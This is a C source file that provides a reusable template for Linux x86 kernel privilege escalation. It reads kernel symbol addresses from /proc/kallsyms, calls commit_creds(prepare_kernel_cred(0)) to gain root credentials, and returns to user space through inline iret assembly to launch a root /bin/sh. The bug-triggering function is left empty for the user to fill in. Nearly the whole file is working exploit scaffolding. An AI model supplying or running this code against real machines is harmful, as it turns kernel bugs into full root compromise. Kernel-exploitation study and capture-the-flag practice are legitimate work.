#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/*
 * gcc -m32 -static linux_kernel_x86.c -o linux_kernel_x86
 */

/* 
 * definition of useful structures
 */
struct cred;
struct task_struct;

struct symbol
{
  unsigned long addr;
  char type;
  char name[32];
} s;

/*
 * typedef declaration for the kernel functions
 */
typedef __attribute__((regparm(3))) (*__commit_creds)(struct cred*);
typedef __attribute__((regparm(3))) (*__prepare_kernel_cred)(struct task_struct*);

__commit_creds commit_creds;
__prepare_kernel_cred prepare_kernel_cred;

unsigned long user_ss, user_rflags, user_cs, user_gs, user_esp;

/*
 * parse line from /proc/kallsyms
 */
int parse_symbol(char *line)
{
  char *endptr;

  s.addr = strtoul(line, &endptr, 16);

  s.type = endptr[0];
  strtok(endptr, " ");
  endptr = strtok(NULL, "\x09");
  strncpy(s.name, endptr, 32);

  return 0;
}

/*
 * return the address from a given symbol name
 */
unsigned long get_symbol_address(char *name)
{
  FILE *fp = NULL;
  char *line = NULL;
  int read = 0;
  size_t len = 0;

  memset(&s, 0, sizeof(s));

  fp = fopen("/proc/kallsyms", "r");
  if (fp == NULL)
    return 0;

  while ((read = getline(&line, &len, fp)) != -1)
  {
    if (line[read - 1] == '\n') line[read - 1] = '\0';

    if(parse_symbol(line))
      return 0;

    if (strcmp(s.name, name) == 0)
    {
      printf("[+] Found symbol %s : 0x%08x\n", s.name, s.addr);
      return s.addr;
    }
  }

  free(line);
  fclose(fp);

  return 0;
}

/*
 * exec /bin/sh
 */
void exec_shell(void) {
  char *shell = "/bin/sh";
  char *args[] = {shell, "-i", NULL};

  if (getuid() == 0)
  {
    printf("[+] Exploit succeded, enjoy your root!\n");
    execve(shell, args, NULL);
  } else {
    printf("[+] Exploit failed.\n");
  }
  
  exit(0);
}

/*
 * modify credentials
 */
void get_root(void)
{
  commit_creds(prepare_kernel_cred(0));
}

/*
 * come back to user land
 */
void ret_to_userland(void)
{
  __asm__(
      "mov %0, 0x10(%%esp)\t\n"
      "mov %1, 0x0c(%%esp)\t\n"
      "mov %2, 0x08(%%esp)\t\n"
      "mov %3, 0x04(%%esp)\t\n"
      "mov %4, 0x00(%%esp)\t\n"
      "mov %5, %%gs\t\n"
      "iret"
      : : "r" (user_ss),
          "r" (user_esp),
          "r" (user_rflags),
          "r" (user_cs),
          "r" (exec_shell),
          "r" (user_gs)
      );
}

/*
 * save userland context
 */
void save_userland_context(void)
{
  __asm__(
      "mov %%cs, %0\t\n"
      "mov %%ss, %1\t\n"
      "mov %%gs, %2\t\n"
      "mov %%esp, %3\t\n"
      "pushf\t\n"
      "pop %4\t\n"
      : "=r" (user_cs), "=r" (user_ss), "=r" (user_gs), "=r" (user_esp), "=r" (user_rflags) : : "memory"
      );
}

/*
 * Exploit function
 */
void exploit(void)
{
  /*
   * Paste your exploit here
   */
}

/*
 * Main function
 *   - Look for some useful symbol addresses
 *   - Trigger the exploit
 *   - Launch a root shell
 */
int main(int argc, char **argv)
{
  int len;

  commit_creds = (__commit_creds)get_symbol_address("commit_creds");
  prepare_kernel_cred = (__prepare_kernel_cred)get_symbol_address("prepare_kernel_cred");

  if (commit_creds == 0 || prepare_kernel_cred == 0)
  {
    printf("[-] Can find symbols addresses.\n");
    return 1;
  }

  // save the userland context
  save_userland_context();

  // exploit code
  exploit();

  return 0;
}
